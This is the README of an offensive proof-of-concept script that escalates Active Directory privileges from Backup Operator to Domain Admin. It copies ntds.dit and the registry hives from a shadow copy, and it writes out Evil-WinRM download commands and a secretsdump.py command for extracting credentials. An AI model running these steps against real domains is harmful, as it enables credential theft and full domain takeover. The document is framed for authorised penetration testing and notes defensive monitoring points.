# 🔒 BackupOperator to Domain Admin Proof of Concept (PoC)

This script demonstrates a **Proof of Concept (PoC)** for escalating privileges from a **Backup Operator** to a **Domain Admin** in an Active Directory environment. It leverages the ability of Backup Operators to create volume shadow copies and access sensitive files such as the `ntds.dit` database and registry hives (`SYSTEM`, `SAM`, `SECURITY`) to extract credentials and escalate privileges.

---

## ✨ Features

- 🚀 Automates the creation of a volume shadow copy using `diskshadow`.
- 📂 Extracts critical files required for credential extraction:
    - `SYSTEM` hive
    - `SAM` hive
    - `SECURITY` hive
    - `ntds.dit` database
- 📤 Outputs the extracted files to the current user's `Documents` directory for further processing.
- 🛠️ Provides instructions for downloading the files using tools like `Evil-WinRM`.

---

## ⚙️ Prerequisites

- 🛡️ The script must be executed with a user account that has **Backup Operator** privileges.
- 💻 The target system must have the `diskshadow` utility available (default on Windows systems).
- 🧰 Ensure you have tools like `Evil-WinRM` or other utilities to download and process the extracted files.

---

## 📝 Usage

1. **Upload the Script**: Transfer the script (`backupToDA.ps1`) to the target system using a method of your choice (e.g., `Evil-WinRM`, `PowerShell`, etc.).
2. **Run the Script**: Execute the script on the target system with sufficient privileges.
3. **Extracted Files**: The following files will be extracted and saved:
     - `SYSTEM` hive
     - `SAM` hive
     - `SECURITY` hive
     - `ntds.dit` database
4. **Download Files**: Use `Evil-WinRM` or similar tools to download the files to your local machine:
     ```powershell
     download SYSTEM
     download SAM
     download SECURITY
     cd ntds
     download ntds.dit
     ```
5. **Process Files**: Use tools like `secretsdump.py` from the Impacket suite to extract credentials from the downloaded files:
     ```bash
     secretsdump.py -system SYSTEM -sam SAM -security SECURITY -ntds ntds.dit LOCAL
     ```

---

## 📂 Output

The script will generate the following files in the specified directories:
- 🗂️ `SYSTEM` hive: `<User Documents>\SYSTEM`
- 🗂️ `SAM` hive: `<User Documents>\SAM`
- 🗂️ `SECURITY` hive: `<User Documents>\SECURITY`
- 🗂️ `ntds.dit` database: `<User Documents>\ntds\ntds.dit`

---

## ⚠️ Disclaimer

This script is intended for **educational purposes** and **authorized penetration testing only**. Unauthorized use of this script on systems you do not own or have explicit permission to test is **illegal** and **unethical**. The author is not responsible for any misuse or damage caused by this script.

---

## 🔍 Use Case

This PoC demonstrates how an attacker with **Backup Operator** privileges can escalate to **Domain Admin** by:
1. 🛠️ Creating a volume shadow copy of the system drive.
2. 📤 Extracting sensitive files (`ntds.dit`, `SYSTEM`, `SAM`, `SECURITY`) from the shadow copy.
3. 🔑 Using the extracted files to dump credentials and escalate privileges.

This highlights the importance of:
- 🔐 Securing **Backup Operator** privileges.
- 📊 Monitoring shadow copy creation on critical systems.

---

**💡 Note**: Always ensure you have proper authorization before using this script in any environment.

